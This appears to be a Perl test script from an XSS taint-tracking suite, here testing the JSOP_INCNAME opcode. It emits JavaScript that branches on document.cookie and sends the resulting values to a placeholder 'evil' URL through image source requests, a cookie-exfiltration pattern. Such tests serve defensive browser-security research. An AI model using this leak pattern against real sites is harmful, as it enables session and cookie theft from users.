#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_INCNAME";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		// shouldn't be evil 
		var notevil = 2;
		var url = "$imgevilurl?normal=" + ++notevil;
		document.images[0].src = url;
		
		// if with evil val 
		var notevil2 = 2;
		if ($evil) {
			++notevil2;
		}
		url = "$imgevilurl?if=" + notevil2;
		document.images[1].src = url;
		
		// normal usage 
		var notevil3 = 1;
		if ($evil) {
			notevil3 = 2;
		}
		++notevil3;
		document.images[2].src = "$imgevilurl?isevil=" + notevil3;
		
    </script>
|;

require "xss_basic_footer.pl";
